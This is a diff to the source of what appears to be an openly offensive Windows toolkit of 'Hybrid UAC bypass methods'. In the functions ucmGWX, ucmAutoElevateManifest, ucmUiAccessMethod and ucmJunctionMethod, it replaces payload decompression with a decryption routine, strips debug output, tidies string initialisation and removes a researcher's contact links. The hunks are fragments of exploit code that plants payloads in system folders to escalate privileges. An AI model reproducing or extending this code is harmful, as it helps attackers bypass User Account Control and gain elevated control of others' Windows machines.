@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.90
 *
-*  DATE:        10 July 2018
+*  DATE:        14 July 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -718,7 +718,7 @@ BOOL ucmGWX(
             break;
         }
 
-        Data = DecompressPayload(Ptr, DataSize, &DecompressedBufferSize);
+        Data = g_ctx.DecryptRoutine(Ptr, DataSize, &DecompressedBufferSize);
         if (Data == NULL)
             break;
 
@@ -832,10 +832,9 @@ BOOL ucmAutoElevateManifestW7(
         _strcat(szDest, lpApplication);
 
         // Copy target to temp directory
-        if (!CopyFile(szSource, szDest, FALSE)) {
-            supDebugPrint(TEXT("ucmAutoElevateManifestW7"), ERROR_FILE_NOT_FOUND);
+        if (!CopyFile(szSource, szDest, FALSE))
             break;
-        }
+
         _strcpy(szSource, szDest);
 
         // Copy target app to windir
@@ -916,10 +915,9 @@ BOOL ucmAutoElevateManifest(
         _strcat(szDest, lpApplication);
 
         // Copy target to temp directory
-        if (!CopyFile(szSource, szDest, FALSE)) {
-            supDebugPrint(TEXT("ucmAutoElevateManifest"), ERROR_FILE_NOT_FOUND);
+        if (!CopyFile(szSource, szDest, FALSE))
             break;
-        }
+        
         _strcpy(szSource, szDest);
 
         // Copy target app to home
@@ -1525,10 +1523,10 @@ BOOL ucmUiAccessMethod(
     BOOL bResult = FALSE, bCond = FALSE;
     SIZE_T Length;
     DWORD DllVirtualSize;
-    LPWSTR lpEnv, lpTargetDll;
+    LPWSTR lpEnv = NULL, lpTargetDll;
     PVOID EntryPoint, DllBase;
     PIMAGE_NT_HEADERS NtHeaders;
-    UNICODE_STRING uStr;
+    UNICODE_STRING uStr = RTL_CONSTANT_STRING(L"ProgramFiles=");
     WCHAR szTarget[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
 
@@ -1587,12 +1585,6 @@ BOOL ucmUiAccessMethod(
         //
         // Build target path in g_lpIncludePFDirs
         //
-        uStr.Buffer = NULL;
-        uStr.Length = 0;
-        uStr.MaximumLength = 0;
-        lpEnv = L"ProgramFiles=";
-        RtlInitUnicodeString(&uStr, lpEnv);
-
         lpEnv = supQueryEnvironmentVariableOffset(&uStr);
         if (lpEnv == NULL)
             break;
@@ -1652,8 +1644,6 @@ BOOL ucmUiAccessMethod(
 * 2) Dll hijack dotnet dependencies.
 *
 * Wusa race condition in combination with junctions found by Thomas Vanhoutte.
-* Twitter: https://twitter.com/SandboxEscaper
-* Blog: https://thomas-vanhoutte.blogspot.be
 *
 */
 BOOL ucmJunctionMethod(
